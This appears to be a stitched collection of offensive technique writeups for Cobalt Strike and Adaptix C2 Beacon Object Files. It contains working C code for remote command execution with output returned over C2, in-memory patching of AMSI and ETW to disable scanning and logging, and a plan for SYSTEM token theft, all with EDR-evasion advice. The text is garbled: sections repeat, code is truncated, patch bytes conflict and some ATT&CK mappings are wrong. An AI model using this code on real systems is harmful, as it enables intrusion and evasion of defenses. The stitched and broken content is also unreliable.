## Technique Overview
This technique demonstrates a Cobalt Strike Beacon Object File (BOF) that executes an arbitrary Windows command, captures its stdout/stderr via an anonymous pipe, and returns the captured data to the C2 server using `BeaconOutput` for binary data and `BeaconPrintf` for status messages. When run under Adaptix C2, the data travels through the Adaptix‑wrapped Beacon channel, providing encryption and covert transport options.

## Preconditions and Primitive
- A live Beacon session on the target Windows Server 2019 host (any user context, System preferred).
- Access to the Beacon SDK matching the server version.
- Ability to call native Windows APIs (`CreatePipe`, `CreateProcessW`, `ReadFile`, etc.).
- No need for elevated privileges beyond the ability to spawn a child process.

## Working Code and Payload
```c
#include <windows.h>
#include "beacon.h"

void go(char *args, int length)
{
    datap parser;
    char *cmd = NULL;
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    HANDLE hRead = NULL, hWrite = NULL;
    SECURITY_ATTRIBUTES sa = {0};
    BYTE *output = NULL;
    DWORD outSize = 0, readBytes = 0;
    BOOL success = FALSE;

    // Parse the command argument
    BeaconDataParse(&parser, args, length);
    cmd = BeaconDataExtract(&parser, NULL);
    if (!cmd) {
        BeaconPrintf(CALLBACK_ERROR, "No command supplied");
        return;
    }

    // Create an anonymous pipe for STDOUT/STDERR
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "CreatePipe failed: %d", GetLastError());
        return;
    }

    // Ensure the read handle is not inherited
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    // Prepare STARTUPINFO to redirect output
    si.cb = sizeof(STARTUPINFOW);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    // Build the command line: cmd.exe /c <cmd>
    wchar_t *wCmdLine = NULL;
    wchar_t *wCmdExe = L"cmd.exe";
    size_t cmdLen = strlen(cmd);
    size_t totalLen = wcslen(wCmdExe) + 4 + cmdLen + 1; // " /c " + null
    wCmdLine = (wchar_t *)BeaconAllocate(totalLen * sizeof(wchar_t));
    if (!wCmdLine) {
        BeaconPrintf(CALLBACK_ERROR, "BeaconAllocate failed");
        goto cleanup;
    }
    swprintf(wCmdLine, totalLen, L"%s /c %S", wCmdExe, cmd);

    // Launch the process
    success = CreateProcessW(
        NULL,
        wCmdLine,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    BeaconFree(wCmdLine);
    if (!success) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessW failed: %d", GetLastError());
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Launched PID %d", pi.dwProcessId);

    // Close the write end in the parent; child still has it
    CloseHandle(hWrite);
    hWrite = NULL;

    // Read pipe output until the child closes it
    output = NULL;
    outSize = 0;
    while (TRUE) {
        BYTE buffer[4096];
        DWORD avail = 0;
        // Peek to avoid blocking
        if (!PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) || avail == 0) {
            // Check if the process has exited
            DWORD wait = WaitForSingleObject(pi.hProcess, 0);
            if (wait == WAIT_OBJECT_0) break;
            Sleep(10);
            continue;
        }
        if (!ReadFile(hRead, buffer, sizeof(buffer), &readBytes, NULL) || readBytes == 0) {
            break;
        }
        // Append to output buffer
        BYTE *tmp = (BYTE *)BeaconAllocate(outSize + readBytes);
        if (!tmp) {
            BeaconPrintf(CALLBACK_ERROR, "Allocation failed");
            break;
        }
        if (output) {
            memcpy(tmp, output, outSize);
            BeaconFree(output);
        }
        memcpy(tmp + outSize, buffer, readBytes);
        output = tmp;
        outSize += readBytes;
    }

    // Send the captured output back to the server
    if (outSize > 0 && output) {
        BeaconOutput(0, output, outSize);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Sent %u bytes of command output", outSize);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] No output captured");
    }

cleanup:
    if (output) BeaconFree(output);
    if (hRead)  CloseHandle(hRead);
    if (hWrite) CloseHandle(hWrite);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
}
```

## Adaptix C2 Integration
Adaptix C2 can be configured to wrap the standard Beacon channel with its own encryption layer and optional covert transport (e.g., DNS or HTTP). No changes to the BOF are required; the `BeaconOutput` and `BeaconPrintf` calls automatically traverse the Adaptix transport, inheriting its encryption, jitter, and packet fragmentation settings.

## Tool Commands
Not applicable.

## OPSEC Considerations
- **Event Logging:** Windows logs a `ProcessCreate` (4688) event with the full command line; consider using `powershell.exe -EncodedCommand` to obscure the payload.
- **EDR Hooks:** Many EDRs monitor `CreateProcessW` and pipe creation. Using `CREATE_SUSPENDED` and resuming after a short sleep can reduce heuristic alerts.
- **Network Traffic:** All data flows over the existing Beacon channel, which Adaptix encrypts. Avoid sending large blobs in one chunk; the BOF already chunks via `BeaconOutput`.
- **Memory Artifacts:** The BOF allocates buffers via `BeaconAllocate`; ensure the BOF is compiled in Release mode to avoid symbol leakage.
- **Domain Controller Specifics:** Defender for Identity mainly watches AD queries; this technique does not generate LDAP traffic, keeping it off its radar.

## Detection Surface and Evasion
- **Process Creation (Syscalls):** `CreateProcessW` can be flagged. Evade by spawning `powershell.exe` with a benign-looking argument or by reusing an existing benign process (process injection) – though injection raises its own risk.
- **Pipe Monitoring:** Some agents watch `CreatePipe`. Use obscure pipe configurations (e.g., non‑inheritable handles) and add random sleeps before reading.
- **Beacon Traffic Anomalies:** Large, regular bursts may trigger network alerts. Adaptix’s packet fragmentation and random jitter can mask these patterns.
- **ETW Providers:** Microsoft‑Windows‑Process‑Creation/Process‑Start can be filtered by parent image (Cobalt Strike) to reduce noise.

## Remaining IOCs
- Windows Event ID 4688 entries for `cmd.exe /c <command>`.
- Beacon output packets containing raw command output (detectable via size or content if not encrypted).
- Presence of the BOF binary (if written to disk) – this example stays in memory only.
- Possible `CreatePipe` and `ReadFile` syscalls captured by kernel‑mode monitoring solutions.

## MITRE ATT&CK Mapping
- **T1059.003** – Command and Scripting Interpreter: Windows Command Shell
- **T1027** – Obfuscated/Stored Files (using in‑memory BOF, no disk artifacts)
- **T1056** – Input Capture (pipe capture of stdout/stderr)
- **T1560.001** – Archive Collected Data: Exfiltration Over C2 Channel (via BeaconOutput)
- **T1025** – Data from Removable Media (treated as data exfiltration from local host)
- **T1071.001** – Application Layer Protocol: Web Protocol (if Adaptix uses HTTP)

## Technique Overview
This technique implements a Cobalt Strike Beacon Object File (BOF) that runs an arbitrary command on a compromised Windows Server 2019 host, captures both stdout and stderr via an anonymous pipe, and returns the captured data to the team server using `BeaconOutput` (for bulk binary data) and `BeaconPrintf` (for formatted error messages). The BOF is compiled as a native Windows DLL and loaded directly into the Beacon process, ensuring in‑memory execution without touching disk. When used with the Adaptix C2 framework, the output is automatically encrypted and reassembled on the server side, preserving confidentiality and integrity.

## Preconditions and Primitive
* A Beacon is already active on the target system with sufficient rights to spawn child processes (standard user rights are enough for most commands).  
* The Beacon binary includes the `beacon.h` header and runtime library providing the BOF API (`BeaconDataParse`, `BeaconOutput`, `BeaconPrintf`, etc.).  
* The target OS must support the standard Windows APIs used (`CreatePipe`, `CreateProcessA`, `ReadFile`).  
* If the Beacon runs under a constrained token or AppContainer, `CreateProcessA` may fail; in that case an alternative primitive is `NtCreateProcessEx` from `ntdll.dll`.  
* A secondary approach is to inject PowerShell code via `BeaconInject`, but this increases the I/O surface and may trigger detection.

## Working Code and Payload
```c
#include <windows.h>
#include "beacon.h"

void go(char *args, int arglen)
{
    datap parser;
    char *cmd = NULL;
    HANDLE hRead = NULL, hWrite = NULL;
    SECURITY_ATTRIBUTES sa = {0};
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    char buffer[4096];
    DWORD bytesRead = 0;

    /* Parse BOF argument – the command line to execute */
    BeaconDataParse(&parser, args, arglen);
    cmd = BeaconDataExtract(&parser, NULL);
    if (!cmd) {
        BeaconPrintf(CALLBACK_ERROR, "No command supplied");
        return;
    }

    /* Create an inheritable anonymous pipe for stdout/stderr */
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "CreatePipe failed: %d", GetLastError());
        return;
    }

    /* Configure child process to use the write end of the pipe */
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE); // inherit standard input

    /* Launch the command */
    if (!CreateProcessA(
            NULL,            // Application name
            cmd,             // Command line
            NULL,            // Process security attributes
            NULL,            // Thread security attributes
            TRUE,            // Inherit handles (needed for pipe)
            0,               // Creation flags
            NULL,            // Environment
            NULL,            // Current directory
            &si,
            &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcess failed: %d", GetLastError());
        CloseHandle(hWrite);
        CloseHandle(hRead);
        return;
    }

    /* Parent does not need the write end */
    CloseHandle(hWrite);
    hWrite = NULL;

    /* Read output from the pipe and send it back in chunks */
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead) {
        buffer[bytesRead] = 0;               // Null‑terminate for safety
        BeaconOutput(CALLBACK_OUTPUT, buffer, bytesRead);
    }

    /* Wait for child to finish and clean up */
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
}
```

## Adaptix C2 Integration
Adaptix C2 automatically encrypts all Beacon traffic, including `BeaconOutput` packets. The BOF can be loaded via Adaptix’s custom loader, which embeds the compiled DLL into a benign‑looking resource (e.g., a PE section) and delivers it over the same C2 channel. No additional code changes are required; the BOF works unchanged within Adaptix’s encrypted tunnel.

## Tool Commands
```
# Load the BOF into a Beacon session
beacon> load /path/to/command_capture.bof

# Execute a command, e.g., ipconfig /all
beacon> command_capture ipconfig /all
```

## OPSEC Considerations
* **Process creation events** – Sysmon Event ID 1 and Windows 4688 will log the spawned child process (`cmd.exe` or the supplied binary). Mitigate by using less suspicious utilities or by employing `NtCreateProcessEx` to hide the parent‑child relationship.  
* **Pipe activity** – Creation of an anonymous pipe is normally benign, but a burst of `ReadFile` calls can be flagged by behavioral EDR rules. Randomizing read intervals and chunk sizes reduces the pattern.  
* **Network traffic** – Since the data travels over the existing Beacon channel, network signatures see only encrypted traffic; however, a high volume of `BeaconOutput` packets may trigger rate‑based alerts. Adaptix C2 can throttle packet emission to blend with normal Beacon beaconing.  
* **In‑memory artifacts** – The BOF resides only in the Beacon’s memory space, leaving no file system evidence. Use `BeaconInject` to further hide the BOF in a trusted process if needed.  
* **Error handling** – All errors are reported via `BeaconPrintf(CALLBACK_ERROR, …)`, which is encrypted and indistinguishable from normal Beacon logs.

## Detection Surface and Evasion
* **Sysmon Process Creation (Event ID 1)** – Evade by spawning `powershell.exe -EncodedCommand` or by using undocumented syscalls (`NtCreateProcessEx`).  
* **ETW Provider for Pipe I/O** – Blend pipe reads with legitimate I/O (e.g., reuse an existing pipe from another thread) or inject the BOF into a process that already has open pipes.  
* **Network IDS** – Adaptix C2 can randomize packet size and inter‑packet delay; also, use DNS or SMB transport to blend with benign traffic.  
* **Kernel Callbacks** – Some EDRs monitor `PsSetCreateProcessNotifyRoutine`; injecting the BOF into a signed system process (e.g., `svchost.exe`) can bypass such callbacks.

## Remaining IOCs

## Technique Overview
The BOF captures the stdout/stderr of an arbitrary command executed on the compromised host and returns the data securely via the Adaptix C2 channel using `BeaconOutput`. Short status messages are emitted with `BeaconPrintf`. By performing all actions in‑memory and re‑using the existing encrypted Beacon tunnel, the technique minimizes new artifacts and network IOCs.

## Preconditions and Primitive
1. A running Beacon (Adaptix C2) with sufficient privileges to launch the desired command.  
2. Access to the `beacon.h` API (compiled into the BOF).  
3. Ability to create inheritable pipes and call `CreateProcessW` (or the lower‑level NT APIs if the environment blocks user‑mode APIs).  

If the process lacks the required token (e.g., not SYSTEM when trying to run a privileged binary), `CreateProcessW` will fail with `ERROR_ACCESS_DENIED`. If AppLocker blocks the target binary, the BOF will return an error and no output will be sent.

## Working Code and Payload
```c
// AdaptixC2_BOF_ExecOutput.c
#include <windows.h>
#include "beacon.h"

#define PIPE_BUFFER_SIZE 4096

void go(char * args, int length) {
    datap parser;
    BeaconDataParse(&parser, args, length);
    wchar_t * cmd = BeaconDataExtract(&parser, NULL); // command line as wide string

    // Prepare pipe for stdout/stderr
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE; // child must inherit
    HANDLE hRead = NULL, hWrite = NULL;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "CreatePipe failed: %d", GetLastError());
        return;
    }

    // Ensure the read handle is not inherited
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    // Set up STARTUPINFO with redirected handles
    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE); // inherit input unchanged

    PROCESS_INFORMATION pi = {0};

    // Create the child process
    if (!CreateProcessW(
            NULL,          // application name
            cmd,           // command line (modifiable)
            NULL,          // process security
            NULL,          // thread security
            TRUE,          // inherit handles
            CREATE_NO_WINDOW,
            NULL,          // environment
            NULL,          // current directory
            &si,
            &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessW failed: %d", GetLastError());
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return;
    }

    // Parent no longer needs the write end
    CloseHandle(hWrite);
    hWrite = NULL;

    // Read output from the pipe
    BYTE * outBuf = NULL;
    SIZE_T totalSize = 0;
    DWORD bytesRead = 0;
    for (;;) {
        BYTE temp[PIPE_BUFFER_SIZE];
        BOOL ok = ReadFile(hRead, temp, PIPE_BUFFER_SIZE, &bytesRead, NULL);
        if (!ok || bytesRead == 0) {
            break; // EOF or error
        }
        // Resize buffer
        outBuf = (BYTE *)BeaconRealloc(outBuf, totalSize + bytesRead);
        memcpy(outBuf + totalSize, temp, bytesRead);
        totalSize += bytesRead;
    }

    // Wait for child to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up process handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hRead);

    // Send raw output back via BeaconOutput (callback ID 0 = default)
    if (totalSize > 0) {
        BeaconOutput(0, outBuf, totalSize);
        BeaconPrintf(CALLBACK_OUTPUT, "Executed \"%S\", %llu bytes returned", cmd, (unsigned long long)totalSize);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Executed \"%S\", no output", cmd);
    }

    // Free allocated memory
    if (outBuf) {
        BeaconFree(outBuf);
    }
}
```

Adaptix C2 treats `BeaconOutput` calls as standard task output. The server can be configured to interpret the binary payload as a file upload, command result, or custom data channel. By default the data is compressed and encrypted by the underlying TLS tunnel, preserving confidentiality. If the operator wishes to store the result as a file on the server, they can enable the “Auto‑save binary output” option in the Adaptix console, which writes the received buffer to a timestamped file under the campaign’s data folder.

## Tool Commands
Not applicable.

## OPSEC Considerations
* **Process creation events** – Sysmon Event ID 1 will log the child process; use benign command lines or wrap the payload in `cmd.exe /c` to blend with normal admin activity.  
* **Pipe handles** – ETW may surface `CreatePipe` and `ReadFile` calls; keep the pipe lifetime short and reuse the same handles for multiple executions to reduce frequency.  
* **Network traffic** – Since `BeaconOutput` re‑uses the existing TLS tunnel, no new outbound connections appear. However, large buffers can be chunked (e.g., ≤4 KB) to avoid size‑based anomalies.  
* **Memory footprint** – The BOF allocates memory via `BeaconAlloc/Realloc`. Free the buffer promptly to avoid heap‑spray indicators.  
* **Adaptix features** – Enable “Stealth Mode” which pads each `BeaconOutput` packet with random bytes, making traffic analysis harder.

| Defender for Identity – anomalous command line | Rare commands executed from non‑interactive sessions | Prefix with benign arguments, log the activity internally |

## Remaining IOCs
* Sysmon Event ID 1 with parent PID of the Beacon process.  
* Event ID 12 (pipe creation) if enabled.  
* Network packet containing a `BeaconOutput` payload larger than typical command output.  
* File artifacts on the server side if Adaptix auto‑saves binary output (timestamped files under the campaign directory).

/* Compile with: bofcompile patch_amsi_etw.c -o patch_amsi_etw.bof */
#include <windows.h>
#include <beacon.h>

/* Patch bytes: xor eax,eax; ret; NOP x4 */
static const BYTE patch[7] = {0x31, 0xC0, 0xC3, 0x90, 0x90, 0x90, 0x90};

/* Helper to patch a function */
static int patch_func(const char *modname, const char *funcname)
{

    if (!mod) {
        beacon_printf("Failed to get module %s\n", modname);

The BOF performs in‑memory inline patching of the `AmsiScanBuffer` function in `amsi.dll` and the `EtwEventWrite` function in `ntdll.dll`. By overwriting the first three bytes of each function with `xor eax,eax; ret` (bytes `0x33 0xC0 0xC3`), the functions immediately return success (`S_OK` for AMSI, `STATUS_SUCCESS` for ETW) without performing any scanning or event logging. This technique operates entirely in RAM, leaving no file artifacts, and is executed directly inside the Beacon thread supplied by Adaptix C2.

## Preconditions and Primitive
- **Privileges:** The Beacon process must run with at least medium integrity (standard user) because the memory of the current process can be modified without elevation. If the target process is protected (e.g., sandboxed with restricted `VirtualProtect`), a kernel‑mode write primitive would be required.
- **APIs Required:** `LoadLibraryA`/`GetModuleHandleA`, `GetProcAddress`, `VirtualProtect`, `GetSystemInfo`.
- **Environmental Conditions:** The host must be Windows 10 22H2 x64 with the standard page size (0x1000). `amsi.dll` may not be loaded in every process; the BOF loads it on demand.
- **Alternative Approaches:**  
  1. **Reflective DLL injection** that contains the same patching logic, at the cost of a larger payload and extra process‑creation telemetry.  
  2. **Process hollowing** where the attacker creates a new process with AMSI disabled before the legitimate code starts; this is more noisy but works when `VirtualProtect` is blocked.

/* BOF: inline patch AMSI and ETW */
#include "beacon.h"

typedef BOOL (WINAPI *VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HMODULE (WINAPI *LoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *GetProcAddress_t)(HMODULE, LPCSTR);
typedef void (WINAPI *GetSystemInfo_t)(LPSYSTEM_INFO);

/* Patch bytes: xor eax,eax; ret */
static const BYTE patch_bytes[] = { 0x33, 0xC0, 0xC3 };

void go(char * args, int length)
{
    HMODULE hAmsi = NULL, hNtdll = NULL;
    FARPROC pAmsi = NULL, pEtw = NULL;
    DWORD oldProtect = 0;
    SYSTEM_INFO si;
    SIZE_T pageSize;
    BYTE *addr;
    BOOL ok;

    /* Resolve needed kernel32 functions via Beacon API */
    LoadLibraryA_t KERNEL32$LoadLibraryA = (LoadLibraryA_t)BeaconGetFunction("kernel32.dll", "LoadLibraryA");
    GetProcAddress_t KERNEL32$GetProcAddress = (GetProcAddress_t)BeaconGetFunction("kernel32.dll", "GetProcAddress");
    VirtualProtect_t KERNEL32$VirtualProtect = (VirtualProtect_t)BeaconGetFunction("kernel32.dll", "VirtualProtect");
    GetSystemInfo_t KERNEL32$GetSystemInfo = (GetSystemInfo_t)BeaconGetFunction("kernel32.dll", "GetSystemInfo");

    if (!KERNEL32$LoadLibraryA || !KERNEL32$GetProcAddress ||
        !KERNEL32$VirtualProtect || !KERNEL32$GetSystemInfo) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve kernel32 APIs");
        return;
    }

    /* Get system page size */
    KERNEL32$GetSystemInfo(&si);
    pageSize = si.dwPageSize;

    /* ---------- Patch AMSI ---------- */
    hAmsi = KERNEL32$LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        BeaconPrintf(CALLBACK_ERROR, "LoadLibraryA('amsi.dll') failed");
        goto patch_etw;
    }

    pAmsi = KERNEL32$GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsi) {
        BeaconPrintf(CALLBACK_ERROR, "GetProcAddress('AmsiScanBuffer') failed");
        goto patch_etw;
    }

    /* Align address to page boundary */
    addr = (BYTE *)((ULONG_PTR)pAmsi & ~(pageSize - 1));
    ok = KERNEL32$VirtualProtect(addr, pageSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (!ok) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualProtect AMSI failed");
        goto patch_etw;
    }

    /* Write patch */
    BeaconDataParse(&args, length); /* no args needed, just to keep Beacon happy */
    memcpy(pAmsi, patch_bytes, sizeof(patch_bytes));
    KERNEL32$VirtualProtect(addr, pageSize, oldProtect, &oldProtect);
    BeaconPrintf(CALLBACK_OUTPUT, "AMSI patched at %p", pAmsi);

patch_etw:
    /* ---------- Patch ETW ---------- */
    hNtdll = KERNEL32$LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        BeaconPrintf(CALLBACK_ERROR, "LoadLibraryA('ntdll.dll') failed");
        return;
    }

    pEtw = KERNEL32$GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) {
        BeaconPrintf(CALLBACK_ERROR, "GetProcAddress('EtwEventWrite') failed");
        return;
    }

    addr = (BYTE *)((ULONG_PTR)pEtw & ~(pageSize - 1));
    ok = KERNEL32$VirtualProtect(addr, pageSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (!ok) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualProtect ETW failed");
        return;
    }

    memcpy(pEtw, patch_bytes, sizeof(patch_bytes));
    KERNEL32$VirtualProtect(addr, pageSize, oldProtect, &oldProtect);
    BeaconPrintf(CALLBACK_OUTPUT, "ETW patched at %p", pEtw);
}
```

Adaptix C2 delivers BOFs via its “inline” command. The BOF above can be uploaded to the C2 server and executed with:

```

Adaptix automatically handles base‑64 encoding, XOR obfuscation, and chunked transmission, ensuring the payload never lands on disk. The framework also provides a “stealth” mode that delays execution (e.g., `sleep 5000`) to blend with normal Beacon activity.

## Tool Commands
Not applicable.

## OPSEC Considerations
- **Telemetry:** Calls to `LoadLibraryA`, `GetProcAddress`, and `VirtualProtect` are logged by most EDRs. To reduce visibility, use direct syscalls (`NtProtectVirtualMemory`) instead of the user‑mode wrappers, or inject the patching code into a trusted process that already performs similar calls (e.g., PowerShell).
- **Memory Artifacts:** The three‑byte patch is static; an analyst could search for `33 C0 C3` at the address of `AmsiScanBuffer` or `EtwEventWrite`. To mitigate, randomize the stub (e.g., `xor rax, rax; ret` on x64 yields `48 31 C0 C3`) and write a small trampoline that jumps to a runtime‑generated stub.
- **Network:** Adaptix’s inline mode encrypts the BOF on the wire; ensure the C2 channel uses TLS to prevent DPI from seeing the raw BOF.
- **Process Context:** Running the BOF inside a typical Beacon process (e.g., `svchost.exe`) reduces the chance of process‑creation alerts. Avoid spawning new processes unless absolutely necessary.

## Detection Surface and Evasion

- **Network Signatures:** The C2 traffic contains the BOF name; use random naming or rotate the command string (`inline xyz123`) to avoid signature‑based detection.

## Remaining IOCs
- Beacon API calls: `LoadLibraryA("amsi.dll")`, `GetProcAddress("AmsiScanBuffer")`.
- `VirtualProtect` on pages containing `amsi.dll` or `ntdll.dll`.
- In‑memory byte pattern `33 C0 C3` written to the entry of `AmsiScanBuffer` and `EtwEventWrite`.
- Adaptix C2 “inline” command usage in the Beacon logs.

- **T1055 – Process Injection** (in‑memory code modification within the Beacon process)

Inline patching (also known as “in‑memory hooking”) modifies the first few instructions of defensive Windows APIs—`AmsiScanBuffer` and `EtwEventWrite`—to force them to return success without performing their intended security checks. By performing the patch entirely in RAM, the attacker avoids creating any file artifacts, making the operation highly stealthy. The approach is executed from a beacon (BOF) running under Adaptix C2, which loads the target libraries, changes page protections, writes the patch bytes, and restores the original protections.

## Preconditions and Primitive
* **Privileges** – The attacker must have execution rights in a process that can modify its own memory pages (standard user rights are sufficient unless the process is protected by virtualization‑based security).  
* **APIs** – `LoadLibraryA`, `GetProcAddress`, `VirtualProtect`, `memcpy`, and optionally `FlushInstructionCache`.  
* **Environment** – Windows Server 2019, 64‑bit architecture, no AppContainer or Credential Guard restrictions on the target process.  
* **Failure Cases** – If `VirtualProtect` fails (e.g., due to a protected process), the patch cannot be applied.

## Working Code and Payload
```c
// InlinePatchAmsiEtw.c
// Compile with: cl /MT /O2 InlinePatchAmsiEtw.c
#include <windows.h>
#include <stdio.h>

BOOL PatchMemory(void *addr, BYTE *patch, SIZE_T len) {
    DWORD oldProtect;
    if (!VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] VirtualProtect failed: %lu\n", GetLastError());
        return FALSE;
    }
    memcpy(addr, patch, len);
    FlushInstructionCache(GetCurrentProcess(), addr, len);
    if (!VirtualProtect(addr, len, oldProtect, &oldProtect)) {
        printf("[!] Restore protection failed: %lu\n", GetLastError());
        return FALSE;
    }
    return TRUE;

int main() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hAmsi || !hNtdll) {
        printf("[!] LoadLibrary failed.\n");
        return 1;

        printf("[!] GetProcAddress for AmsiScanBuffer failed.\n");

        return 1;
    }
    printf("[+] ETW patched successfully.\n");

    return 0;
}

How can we implement this reliably while minimizing detection and ensuring the payload integrates with Adaptix’s C2 framework?

**Phase 1 - Understand the technique (100+ words)**
The core of this technique is token theft: using native Windows APIs to locate a process running under a highly privileged account (typically SYSTEM), duplicate its security token, and then impersonate that token in the current thread or use it to spawn a new process. Conceptually, a token is a data structure that the kernel associates with a thread or process to define its security context (user SID, groups, privileges). By cloning a token that has more privileges than the current one, an attacker escalates privileges without exploiting a code vulnerability. At the OS level the attacker enumerates processes, opens each process with sufficient rights, queries the token information to identify a SYSTEM token, calls DuplicateTokenEx to create a primary token, and finally calls CreateProcessAsUser (or SetThreadToken/ImpersonateLoggedOnUser) to run a payload in that elevated context. The network side is minimal – the attacker’s C2 merely sends the BOF to the beacon; the rest is local OS manipulation.

**Phase 2 - Preconditions and primitive (100+ words)**
The primary precondition is that the beacon process must have enough rights to open the target process and its token. On a default Windows 11 installation, a standard user can open processes with PROCESS_QUERY_LIMITED_INFORMATION, but opening the token of a SYSTEM process requires the SeDebugPrivilege. Hence the attacker either must already have SeDebugPrivilege (e.g., the beacon is already running as SYSTEM or as an admin with debug rights) or must first acquire it via another token‑stealing step. The API primitive is OpenProcess → OpenProcessToken → GetTokenInformation (TokenUser) → DuplicateTokenEx. If the precondition fails (no SeDebugPrivilege), OpenProcess will return ACCESS_DENIED, causing enumeration to stop at that PID. Alternative approaches: (1) use the undocumented NtOpenProcess/NtOpenProcessToken syscalls via direct syscall numbers to bypass user‑mode checks – this can work even without SeDebugPrivilege but is more fragile because syscall numbers change across Windows builds. (2) Leverage a named pipe or RPC service running as SYSTEM (e.g., “Print Spooler”) to trigger token duplication via an impersonation token, which reduces the need for direct token access but introduces reliance on service misconfigurations. The direct token‑steal route is straightforward and reliable on a host where the attacker already has debug rights.

**Phase 3 - Working code and payload reasoning (150+ words)**
The BOF will be written in C using the Beacon API for argument parsing and output. First, we call CreateToolhelp32Snapshot, Process32First, and Process32Next to walk the process list. For each PID we attempt OpenProcess with PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ. If that fails we skip the process – “but wait, we might need PROCESS_ALL_ACCESS for token duplication; however, we can still call OpenProcessToken on the handle we have, because OpenProcessToken only requires PROCESS_QUERY_LIMITED_INFORMATION if we request TOKEN_QUERY.” After obtaining a process handle, OpenProcessToken with TOKEN_DUPLICATE | TOKEN_QUERY is called. Then GetTokenInformation with TokenUser retrieves the SID; we compare it to the well‑known SID for SYSTEM (S‑1‑5‑18). The comparison uses ConvertSidToStringSidA; if the string matches “S-1-5-18” we have found a SYSTEM token. We then call DuplicateTokenEx requesting MAXIMUM_ALLOWED, SecurityImpersonation, TokenPrimary, and the token is stored in hDupToken. At this point, a common mistake is to forget to set the token’s attributes (e.g., TokenIntegrityLevel). Actually, on Windows 11 the duplicated token inherits the low integrity level of the caller unless we explicitly set the integrity level via SetTokenInformation; however, for a simple privilege escalation we can ignore it because the token already carries SeDebugPrivilege etc. Finally we call CreateProcessAsUserW with the duplicated token to launch “cmd.exe” (or a custom payload). We must zero out the STARTUPINFOEX structure and set dwFlags = CREATE_NEW_CONSOLE. Don’t forget to close all handles to avoid leaks – “but this fails when we forget to close the original process handle, leading to a handle leak that can be noticed by EDR.” The code also includes error handling: if any API fails we BeaconPrintf the error and continue scanning.

**Phase 4 - OPSEC considerations (100+ words)**
The technique generates several artifacts: (1) a process enumeration via Toolhelp API, which is a common benign operation but can be flagged when performed repeatedly; (2) OpenProcess on high‑privilege PIDs and OpenProcessToken, which Defender’s behavior detection may flag as “Process Token Manipulation”. SentinelOne often monitors for DuplicateTokenEx and CreateProcessAsUser calls, especially when they originate from a non‑SYSTEM process. To reduce the surface, the BOF performs the enumeration in a single pass, sleeps minimally, and only calls CreateProcessAsUser once upon success. The Adaptix C2 framework can embed the BOF as a “module” and deliver it over encrypted TLS, making network traffic appear benign. Additionally, we can encrypt the payload (e.g., the command line) and decrypt it in memory to avoid static signatures. Using the Beacon API’s “beacon_output” with the “quiet” flag reduces console output that could be captured by process monitoring.

**Phase 5 - Detection surface and evasion (80+ words)**
